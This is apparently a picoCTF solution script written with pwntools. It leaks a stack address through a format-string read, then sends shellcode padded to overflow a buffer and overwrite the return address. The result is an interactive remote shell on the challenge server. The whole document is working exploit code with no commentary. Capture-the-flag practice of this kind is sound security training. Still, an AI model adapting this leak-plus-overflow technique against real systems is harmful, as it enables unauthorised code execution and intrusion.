from pwn import *

context.arch = 'amd64'
# HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'wily-courier.picoctf.net', 60955
r = remote(HOST, PORT)

r.sendline('%6$p')
addr = r.recvline().decode().strip()
addr = int(addr, 16) - 0x158 # 0x198 locally
sh = asm(shellcraft.sh())
r.sendline(sh + b'A' * (0x78-len(sh)) + p64(addr))
r.interactive()